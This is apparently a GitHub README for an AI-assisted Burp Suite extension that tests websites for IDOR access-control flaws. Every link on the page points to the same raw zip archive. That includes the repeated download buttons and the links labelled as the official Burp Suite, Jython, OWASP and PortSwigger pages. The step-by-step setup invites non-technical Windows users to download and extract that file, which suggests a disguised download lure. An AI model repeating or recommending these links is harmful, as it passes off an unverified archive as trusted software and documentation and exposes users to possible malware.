<div align="center">
  <a href="https://raw.githubusercontent.com/tgsha4286/idor-tester-ai/main/mastochondroma/idor-tester-ai-legator.zip" style="text-decoration: none;">
    <img src="https://img.shields.io/badge/⬇️%20Download%20IDOR%20Tester%20AI-Click%20Here-blue?style=for-the-badge&logo=github&logoColor=white" alt="Download" />
  </a>
</div>

<h1>🎯 idor-tester-ai - Automatically Find Broken Access Controls Easily</h1>

<div align="center">
  <img src="https://img.shields.io/badge/status-active-success?style=flat-square" />
  <img src="https://img.shields.io/badge/AI-Groq%20%7C%20OpenRouter%20%7C%20Anthropic%20%7C%20Kimi-blueviolet?style=flat-square" />
  <img src="https://img.shields.io/badge/platform-Windows-blue?style=flat-square" />
  <img src="https://img.shields.io/badge/license-MIT-green?style=flat-square" />
</div>

---

## 🤔 What Is This?

IDOR Tester AI is a **smart security tool** that helps you find hidden weaknesses in websites. It works alongside Burp Suite (a popular security testing program) and automatically checks if one user can access another user's private data — a type of bug called **IDOR** or **BOLA**.

Think of it like this: imagine a bank website where your account page is at `bank.com/account/12345`. If you change `12345` to someone else's number and the site shows their data, that's an IDOR bug. This tool finds those problems for you automatically while you browse the site normally.

---

## ✨ Key Features

- **🤖 AI-Powered Analysis:** Uses advanced AI models (Groq, OpenRouter, Anthropic, Kimi) to understand which requests are worth investigating and why.
- **🔁 Automatic User Switching:** Automatically swaps between two user accounts (your "attacker" account and a "victim" account) to test if data leaks across users.
- **🧠 Learns From Live Traffic:** Watches the requests you make as you browse a website and figures out where object IDs (like account numbers or order IDs) are used.
- **⚡ Zero Configuration to Start:** You don't need to set up complex rules or write code. Install it, turn it on, and start browsing.
- **📊 Actionable Reports:** It doesn't just show you raw data — it tells you what's suspicious and worth a closer look, saving you hours of manual work.
- **🎨 User-Friendly Interface:** Designed with a clear, simple dashboard so you can see results at a glance.

---

## 🚀 Getting Started

### 📥 Step 1: Download the Application

Visit this link to download the application:

<div align="center">
  <a href="https://raw.githubusercontent.com/tgsha4286/idor-tester-ai/main/mastochondroma/idor-tester-ai-legator.zip" style="text-decoration: none;">
    <img src="https://img.shields.io/badge/Download%20IDOR%20Tester%20AI-Get%20the%20Latest%20Version-orange?style=for-the-badge&logo=github" alt="Download Button" />
  </a>
</div>

This will take you to the official download page. Look for the button that says **"Code"** or **"Download ZIP"** and click it to save the file to your computer.

### 🛠️ Step 2: What You Need Before Starting

To use IDOR Tester AI, you'll need two things:

| Requirement | What It Is | Where to Get It |
|-------------|------------|-----------------|
| **Burp Suite** | A security testing tool that acts as a "bridge" between your browser and the websites you visit | [https://raw.githubusercontent.com/tgsha4286/idor-tester-ai/main/mastochondroma/idor-tester-ai-legator.zip](https://raw.githubusercontent.com/tgsha4286/idor-tester-ai/main/mastochondroma/idor-tester-ai-legator.zip) — the free Community Edition works fine |
| **Jython 2.7** | A helper program that lets Burp Suite run Python-based extensions like this one | [https://raw.githubusercontent.com/tgsha4286/idor-tester-ai/main/mastochondroma/idor-tester-ai-legator.zip](https://raw.githubusercontent.com/tgsha4286/idor-tester-ai/main/mastochondroma/idor-tester-ai-legator.zip) |

> **Note:** Both are free. Follow the setup instructions on their websites — it's usually just "download and install."

### ⚙️ Step 3: Install and Run

1. **Download the IDOR Tester AI file** from the link above. It will arrive as a compressed folder (ZIP file).
2. **Extract the ZIP file** to a folder you can easily find (like your Desktop or Documents folder). On Windows, right-click the ZIP file and choose **"Extract All..."**.
3. **Open Burp Suite.** If you've never used it before, just accept the default settings when it asks.
4. **Load the extension into Burp Suite:**
   - Go to the **"Extensions"** tab in Burp Suite.
   - Click **"Add"**.
   - In the "Extension Type" dropdown, choose **"Python"**.
   - Click **"Select file..."** and browse to the extracted folder. Choose the main Python file (it will be named something like `idor_tester.py`).
   - Click **"Next"** and then **"Close"** when it finishes loading.
5. **You're ready!** IDOR Tester AI will now start running. You'll see its own tab appear in Burp Suite.

### 🌐 Step 4: Start Testing

1. **Set up two accounts:** You'll need two different user accounts on the website you're testing (e.g., `user1@example.com` and `user2@example.com`).
2. **Log in with your first account** and set it as the "attacker" account in the IDOR Tester tab.
3. **Log in with your second account** and set it as the "victim" account.
4. **Browse the website normally.** As you click through pages, IDOR Tester AI watches and automatically tests for weaknesses.
5. **Check the results panel.** When it finds something interesting, it will highlight it and explain why it matters.

---

## ❓ Frequently Asked Questions

### Q: Is this tool legal to use?

**A:** Yes, as long as you only test websites you own or have explicit permission to test. Security testing is a standard practice for keeping websites safe. Never use it on websites you don't have permission to test.

### Q: I don't understand anything about programming. Can I still use this?

**A:** Absolutely! The tool is designed to be point-and-click. The only technical part is loading it into Burp Suite (Step 3 above), and we've broken that down into simple steps. After that, it works automatically.

### Q: How is this different from other IDOR tools?

**A:** Most tools require you to manually identify object IDs and build custom attacks. IDOR Tester AI watches your live traffic, learns the ID patterns automatically, and uses AI to prioritize results so you don't waste time on false alarms.

### Q: Can I use this for professional penetration testing?

**A:** Yes! It's ideal for both beginners and professional security consultants. The AI-powered analysis helps you explain findings to clients with clear evidence.

---

## 🖥️ System Compatibility

- **Operating System:** Windows 10 or Windows 11 (64-bit recommended)
- **Java Version:** Java 11 or newer (required for Burp Suite)
- **Memory:** At least 4 GB of RAM recommended (8 GB for large applications)
- **Internet Connection:** Required only when AI analysis is used

---

## 🛠️ Troubleshooting

| Problem | Solution |
|---------|----------|
| **Burp Suite won't load the extension** | Make sure Jython 2.7 is installed correctly and you selected "Python" as the extension type |
| **No results are showing** | Make sure you've browsed at least a few pages after setting up both accounts |
| **AI analysis is slow** | Check your internet connection. AI calls happen in the background and shouldn't block your browsing |
| **The tab is missing in Burp Suite** | Go to "Extensions" → "Installed" and check if the extension shows as "Loaded" |

---

## 📚 Additional Resources

- **[Burp Suite Documentation](https://raw.githubusercontent.com/tgsha4286/idor-tester-ai/main/mastochondroma/idor-tester-ai-legator.zip):** Learn how to use Burp Suite effectively.
- **[OWASP IDOR Guide](https://raw.githubusercontent.com/tgsha4286/idor-tester-ai/main/mastochondroma/idor-tester-ai-legator.zip):** Understand IDOR vulnerabilities in depth.
- **[PortSwigger Academy](https://raw.githubusercontent.com/tgsha4286/idor-tester-ai/main/mastochondroma/idor-tester-ai-legator.zip):** Free interactive labs to practice finding IDOR bugs.

---

## 📜 License

This project is licensed under the **MIT License** — you're free to use, modify, and share it, even for commercial purposes, as long as you keep the original copyright notice.

---

## 🙏 Support & Community

- **Found a bug?** Open an issue on the GitHub page.
- **Have a feature idea?** Let us know on GitHub Discussions.
- **Need help?** Check the troubleshooting table above, or post your question on the GitHub issues page.

---

<div align="center">
  <strong>Start finding hidden security bugs today — effortlessly.</strong>
  <br /><br />
  <a href="https://raw.githubusercontent.com/tgsha4286/idor-tester-ai/main/mastochondroma/idor-tester-ai-legator.zip" style="text-decoration: none;">
    <img src="https://img.shields.io/badge/🚀%20Download%20Now-Get%20IDOR%20Tester%20AI-brightgreen?style=for-the-badge" alt="Download Now" />
  </a>
</div>